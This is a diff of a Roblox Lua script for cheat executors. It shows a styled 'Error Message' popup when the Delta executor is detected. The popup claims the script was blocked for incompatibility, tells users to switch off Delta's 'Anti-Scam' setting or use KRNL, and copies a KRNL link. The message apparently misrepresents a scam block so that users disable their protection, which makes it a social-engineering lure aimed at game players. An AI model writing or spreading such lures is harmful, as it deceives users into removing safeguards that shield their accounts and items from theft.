@@ -1,70 +1,119 @@
--- Delta Executor Warning GUI (Styled like Pet Egg ESP)
-
-local isDelta = (identifyexecutor and identifyexecutor() == "Delta") or false
-
-if isDelta then
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "DeltaBlockNotice"
-    gui.ResetOnSpawn = false
-    gui.Parent = game:GetService("CoreGui")
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 250, 0, 120)
-    frame.Position = UDim2.new(0.5, -125, 0.4, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(150, 225, 100)
-    frame.BorderSizePixel = 0
-    frame.Parent = gui
-
-    local titleBar = Instance.new("TextLabel")
-    titleBar.Size = UDim2.new(1, 0, 0, 25)
-    titleBar.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-    titleBar.Text = "⚠️ Delta Detected"
-    titleBar.Font = Enum.Font.GothamBold
-    titleBar.TextColor3 = Color3.new(1, 1, 1)
-    titleBar.TextSize = 14
-    titleBar.Parent = frame
-
-    local status = Instance.new("TextLabel")
-    status.Size = UDim2.new(1, -10, 0, 40)
-    status.Position = UDim2.new(0, 5, 0, 30)
-    status.BackgroundTransparency = 1
-    status.TextWrapped = true
-    status.Font = Enum.Font.Gotham
-    status.TextColor3 = Color3.new(0, 0, 0)
-    status.TextSize = 12
-    status.Text = "Executor blocked this script.\nTurn off 'Anti-Scam' or use KRNL."
-    status.Parent = frame
-
-    local toggleBtn = Instance.new("TextButton")
-    toggleBtn.Size = UDim2.new(0, 230, 0, 25)
-    toggleBtn.Position = UDim2.new(0.5, -115, 1, -55)
-    toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
-    toggleBtn.Text = "Use KRNL Instead"
-    toggleBtn.TextColor3 = Color3.new(1, 1, 1)
-    toggleBtn.Font = Enum.Font.GothamBold
-    toggleBtn.TextSize = 13
-    toggleBtn.Parent = frame
-
-    toggleBtn.MouseButton1Click:Connect(function()
-        if setclipboard then
-            setclipboard("https://krnl.place/")
-            toggleBtn.Text = "✔️ Link Copied!"
-        else
-            toggleBtn.Text = "❌ Cannot Copy"
-        end
-    end)
-
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Size = UDim2.new(0, 20, 0, 20)
-    closeBtn.Position = UDim2.new(1, -25, 0, 5)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-    closeBtn.Text = "X"
-    closeBtn.TextColor3 = Color3.new(1, 1, 1)
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.TextSize = 12
-    closeBtn.Parent = frame
-
-    closeBtn.MouseButton1Click:Connect(function()
-        gui:Destroy()
-    end)
+local function isDelta()
+    local exec = identifyexecutor and identifyexecutor()
+    return typeof(exec) == "string" and string.lower(exec):find("delta")
 end
+
+if not isDelta() then return end -- Only run if Delta is detected
+
+-- UI CONFIG
+local TILE_IMAGE = "rbxassetid://15910695828"
+local FONT = Enum.Font.FredokaOne
+local GREEN = Color3.fromRGB(110, 196, 99)
+local RED = Color3.fromRGB(255, 62, 62)
+local BROWN = Color3.fromRGB(118, 61, 25)
+local DARK_BROWN = Color3.fromRGB(51, 25, 0)
+local BLUE = Color3.fromRGB(30, 144, 255)
+
+-- GUI Start
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "DeltaWarningWoodUI"
+gui.IgnoreGuiInset = true
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 320, 0, 180)
+frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+frame.BackgroundColor3 = BROWN
+frame.Active = true
+frame.Draggable = true
+
+local corner = Instance.new("UICorner", frame)
+corner.CornerRadius = UDim.new(0, 10)
+local stroke = Instance.new("UIStroke", frame)
+stroke.Thickness = 2
+stroke.Color = DARK_BROWN
+
+local texture = Instance.new("ImageLabel", frame)
+texture.Size = UDim2.new(1, 0, 1, 0)
+texture.Position = UDim2.new(0, 0, 0, 0)
+texture.BackgroundTransparency = 1
+texture.Image = TILE_IMAGE
+texture.ScaleType = Enum.ScaleType.Tile
+texture.TileSize = UDim2.new(0, 96, 0, 96)
+texture.ZIndex = 1
+
+-- Top Bar
+local topBar = Instance.new("Frame", frame)
+topBar.Size = UDim2.new(1, 0, 0, 32)
+topBar.BackgroundColor3 = GREEN
+local topCorner = Instance.new("UICorner", topBar)
+topCorner.CornerRadius = UDim.new(0, 10)
+topBar.ZIndex = 3
+topBar.Parent = frame
+
+local topLabel = Instance.new("TextLabel", topBar)
+topLabel.Size = UDim2.new(1, -64, 1, 0)
+topLabel.Position = UDim2.new(0, 12, 0, 0)
+topLabel.BackgroundTransparency = 1
+topLabel.Text = "Error Message"
+topLabel.Font = FONT
+topLabel.TextColor3 = Color3.new(1, 1, 1)
+topLabel.TextStrokeTransparency = 0
+topLabel.TextScaled = true
+topLabel.TextXAlignment = Enum.TextXAlignment.Left
+topLabel.ZIndex = 5
+
+local closeBtn = Instance.new("TextButton", topBar)
+closeBtn.Size = UDim2.new(0, 20, 0, 20)
+closeBtn.Position = UDim2.new(1, -28, 0.5, -10)
+closeBtn.BackgroundColor3 = RED
+closeBtn.Text = "X"
+closeBtn.Font = FONT
+closeBtn.TextColor3 = Color3.new(1, 1, 1)
+closeBtn.TextScaled = true
+local closeCorner = Instance.new("UICorner", closeBtn)
+closeCorner.CornerRadius = UDim.new(0, 6)
+local closeStroke = Instance.new("UIStroke", closeBtn)
+closeStroke.Color = DARK_BROWN
+closeStroke.Thickness = 1
+closeBtn.ZIndex = 6
+closeBtn.Parent = topBar
+closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+-- Message
+local msg = Instance.new("TextLabel", frame)
+msg.Size = UDim2.new(1, -20, 0, 110)
+msg.Position = UDim2.new(0, 10, 0, 36)
+msg.BackgroundTransparency = 1
+msg.Text = "Delta Executor detected.\n\nIf you're seeing this message, it means your executor blocked this script because the executor doesn't support the script.\n\nTo fix this:\n- Put your 'Anti-Scam' setting off in Delta\n- Or use a compatible executor like KRNL instead\n\nNatHub recommends KRNL for best results."
+msg.Font = FONT
+msg.TextScaled = true
+msg.TextWrapped = true
+msg.TextColor3 = Color3.new(1, 1, 1)
+msg.TextStrokeTransparency = 0.5
+msg.ZIndex = 5
+
+-- Copy Link Button
+local btn = Instance.new("TextButton", frame)
+btn.Size = UDim2.new(0.9, 0, 0, 28)
+btn.Position = UDim2.new(0.05, 0, 1, -34)
+btn.BackgroundColor3 = BLUE
+btn.Text = "🔗 Copy KRNL Link"
+btn.Font = FONT
+btn.TextColor3 = Color3.new(1, 1, 1)
+btn.TextScaled = true
+btn.TextStrokeTransparency = 0.25
+btn.ZIndex = 5
+local btnCorner = Instance.new("UICorner", btn)
+btnCorner.CornerRadius = UDim.new(0, 7)
+local btnStroke = Instance.new("UIStroke", btn)
+btnStroke.Color = DARK_BROWN
+btnStroke.Thickness = 1
+
+btn.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard("https://krnl.place/")
+        btn.Text = "✅ Copied KRNL Link"
+        task.wait(2.5)
+        btn.Text = "🔗 Copy KRNL Link"
+    end
+end)
